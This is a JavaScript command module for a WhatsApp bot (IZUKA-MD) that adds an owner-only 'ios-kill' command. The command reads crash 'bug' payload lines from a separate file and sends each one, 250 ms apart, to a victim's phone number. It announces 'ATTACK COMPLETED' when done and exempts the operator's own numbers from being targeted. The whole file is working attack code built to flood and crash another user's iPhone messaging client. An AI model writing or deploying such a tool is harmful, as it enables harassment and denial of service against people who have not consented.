const bugchat = require('../../bug/izuka3.js');
const config = require('../../config');
const { cmd } = require('../command');

cmd({
  pattern: 'ios-kill',
  desc: 'Envoie un bug iOS puissant',
  category: 'bug',
  filename: __filename
}, async (m, Matrix) => {
  const prefix = config.PREFIX;
  const cmdName = m.body.startsWith(prefix)
    ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
    : '';

  if (cmdName !== 'ios-kill') return;

  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const senderId = m.sender;

  const allowed = [
    botNumber,
    config.OWNER_NUMBER + '@s.whatsapp.net',
    ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
  ];

  if (!allowed.includes(senderId)) {
    return await Matrix.sendMessage(m.from, {
      text: '🚫 *THIS IS AN OWNER/SUDO ONLY COMMAND*',
    }, { quoted: m });
  }

  const args = m.body.trim().split(' ').slice(1);
  const targetNumber = args[0];

  if (!targetNumber || isNaN(targetNumber)) {
    return await Matrix.sendMessage(m.from, {
      text: '❌ *Usage:* `.ios-kill 509xxxxxxxxx`',
    }, { quoted: m });
  }

  const safeNumbers = [
    '50942241547',
    config.OWNER_NUMBER,
    ...(config.SUDO || [])
  ];

  if (safeNumbers.includes(targetNumber.replace(/[^0-9]/g, ''))) {
    return await Matrix.sendMessage(m.from, {
      text: '⚠️ *You cannot target this protected number.*',
    }, { quoted: m });
  }

  const targetJid = `${targetNumber}@s.whatsapp.net`;
  const attackLines = bugchat.split('\n').filter(Boolean);

  // Debut mesaj
  await Matrix.sendMessage(m.from, {
    text: `🧠 *IZUKA-MD IOS-KILL DEPLOYED*\n\n👾 Targeting: *+${targetNumber}*\n📱 Device: *iPhone*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
  }, { quoted: m });

  // Envoi chak payload
  for (let i = 0; i < attackLines.length; i++) {
    await Matrix.sendMessage(targetJid, {
      text: `🧨 *IOS-KILL PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _IZUKA-MD ATTACK ENGINE_`,
    });
    await new Promise(r => setTimeout(r, 250));
  }

  // Fini mesaj
  await Matrix.sendMessage(m.from, {
    text: `✅ *ATTACK COMPLETED*\n\n💥 *IOS-KILL successfully delivered to* +${targetNumber}\n🔚 *Operation Finished.*`,
  }, { quoted: m });
});
